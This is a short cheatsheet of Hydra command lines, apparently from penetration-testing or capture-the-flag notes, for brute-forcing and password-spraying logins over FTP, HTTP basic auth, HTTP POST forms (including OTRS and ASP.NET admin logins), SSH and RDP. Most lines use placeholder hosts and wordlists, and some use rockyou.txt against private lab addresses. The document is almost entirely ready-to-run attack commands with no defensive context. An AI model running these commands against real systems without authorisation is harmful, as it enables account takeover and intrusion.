### Cheatsheet
```bash
hydra <RHOST> -l <USERNAME> -p <PASSWORD> <PROTOCOL>
hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> <PROTOCOL>
hydra <RHOST> -C /PATH/TO/WORDLIST/<FILE> ftp

# proxy
export HYDRA_PROXY=connect://127.0.0.1:8080
unset HYDRA_PROXY

# HTTP 401 login
hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin

# HTTP POST
hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/index.php:username=user&password=^PASS^:Login failed. Invalid"
hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s <RPORT>
hydra <RHOST> -l root@localhost -P otrs-cewl.txt http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -vV -f
hydra <RHOST> -l admin -P /PATH/TO/WORDLIST/<FILE> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&__EVENTVALIDATION=COOKIE_2&UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"

# SSH
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201

# RDP
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202

```

